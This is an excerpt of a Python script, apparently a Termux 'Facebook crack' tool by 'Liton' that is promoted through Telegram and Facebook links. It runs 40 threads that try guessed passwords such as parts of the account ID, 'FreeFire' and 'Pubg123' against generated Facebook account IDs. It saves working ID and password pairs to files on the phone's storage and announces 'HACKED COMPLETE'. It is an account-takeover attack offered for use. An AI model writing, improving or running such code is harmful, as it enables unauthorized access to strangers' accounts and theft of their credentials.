# Gift By Liton
# Telegram Id : @Liton_404
# Telegram : https://t.me/fb_crack_termux_all_free_command
# Facebook Group : https://www.facebook.com/profile.php?id=100080048596046
...
for ua in range(10000):
	...
	ugen.append(alhhaj)
os.system("xdg-open https://t.me/updatlogoliton")
logo =("""\033[38;5;46m██╗     ██╗████████╗ ██████╗ ███╗   ██╗
\033[38;5;46m██║     ██║╚══██╔══╝██╔═══██╗████╗  ██║
\033[38;5;46m██║     ██║   ██║   ██║   ██║██╔██╗ ██║
\033[38;5;46m██║     ██║   ██║   ██║   ██║██║╚██╗██║
...
def Liton():
    ...
    print("\033[1;96m ╚═════════════════════════════════╝")
    print("")
    Liton = input(f'\033[1;32m ՏᎬᏞᎬᏟͲᎬᎠ ƳϴႮᎡ ϴᏢͲᏆϴΝ :\033[1;36m ')
    if Liton in ["1","A"]:
        Litons()
    if Liton in ["2","B"]:
        os.system('xdg-open https://www.facebook.com/profile.php?id=100080048596046')
...
def Litons():
    ...
    os.system('clear')
    os.system('https://www.facebook.com/profile.php?id=100080048596046')
    print(logo)
    print("\033[1;91m╔════════════════════════════════════════════╗")
    ...
    with ThreadPool(max_workers=40) as Fb_crack:
        ...
        print(f'\033[1;91m║\033[1;92m CRET BY LITON ')
        print("\033[1;91m╚═════════════════════════════════════╝")
        for love in user:
            pwx = [love,love[2:],code+love[:3],'FreeFire','Pubg123','TikTok','Alh4aj']
            uid = code+love
            Fb_crack.submit(Litonm,uid,pwx,tl)
    print("\033[1;91m╔═══════════════════════════╗")
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HACKED COMPLETE ')
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HI IM Liton ')
    print("\033[1;91m╚═══════════════════════════╝")


def Litonm(uid,pwx,tl):
    global loop
    global cps
    global oks
    global agents
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/Liton-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/Liton-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
